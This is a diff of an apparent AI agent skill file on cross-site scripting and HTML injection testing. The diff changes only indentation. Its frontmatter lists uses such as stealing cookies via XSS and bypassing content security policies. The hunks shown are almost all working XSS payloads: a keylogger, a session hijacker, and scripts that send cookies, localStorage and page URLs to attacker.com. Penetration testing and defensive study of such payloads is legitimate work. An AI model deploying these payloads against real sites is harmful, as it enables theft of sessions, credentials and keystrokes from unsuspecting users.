@@ -2,8 +2,8 @@
 name: Cross-Site Scripting and HTML Injection Testing
 description: This skill should be used when the user asks to "test for XSS vulnerabilities", "perform cross-site scripting attacks", "identify HTML injection flaws", "exploit client-side injection vulnerabilities", "steal cookies via XSS", or "bypass content security policies". It provides comprehensive techniques for detecting, exploiting, and understanding XSS and HTML injection attack vectors in web applications.
 metadata:
-  author: zebbern
-  version: "1.1"
+ author: zebbern
+ version: "1.1"
 ---
 
 # Cross-Site Scripting and HTML Injection Testing
@@ -125,15 +125,15 @@ document.location='http://attacker.com/steal?c='+document.cookie
 <!-- Keylogger injection -->
 <script>
 document.onkeypress=function(e){
-  new Image().src='http://attacker.com/log?k='+e.key;
+ new Image().src='http://attacker.com/log?k='+e.key;
 }
 </script>
 
 <!-- Session hijacking -->
 <script>
 fetch('http://attacker.com/capture',{
-  method:'POST',
-  body:JSON.stringify({cookies:document.cookie,url:location.href})
+ method:'POST',
+ body:JSON.stringify({cookies:document.cookie,url:location.href})
 })
 </script>
 
@@ -378,13 +378,13 @@ new Image().src='http://attacker.com/c='+btoa(document.cookie);
 ```javascript
 <script>
 fetch('https://attacker.com/log',{
-  method:'POST',
-  mode:'no-cors',
-  body:JSON.stringify({
-    cookies:document.cookie,
-    localStorage:JSON.stringify(localStorage),
-    url:location.href
-  })
+ method:'POST',
+ mode:'no-cors',
+ body:JSON.stringify({
+ cookies:document.cookie,
+ localStorage:JSON.stringify(localStorage),
+ url:location.href
+ })
 });
 </script>
 ```
